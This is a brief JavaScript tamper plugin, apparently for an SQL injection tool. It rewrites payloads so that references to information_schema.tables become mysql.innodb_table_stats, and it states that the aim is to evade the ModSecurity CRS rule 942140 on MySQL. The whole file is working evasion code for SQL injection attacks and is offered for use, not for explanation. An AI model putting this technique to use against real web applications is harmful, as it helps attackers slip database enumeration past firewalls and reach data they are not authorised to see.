//@name: information_schema转innodb
//@usage: payload
//@enable: false
//@description: information_schema.tables→mysql.innodb_table_stats（绕CRS 942140，MySQL）
function tamper(payload){
    if (!payload || !/information_schema\.tables/i.test(payload)) { return payload; }
    return payload.replace(/information_schema\.tables/gi, 'mysql.innodb_table_stats').replace(/table_schema/gi, 'database_name');
}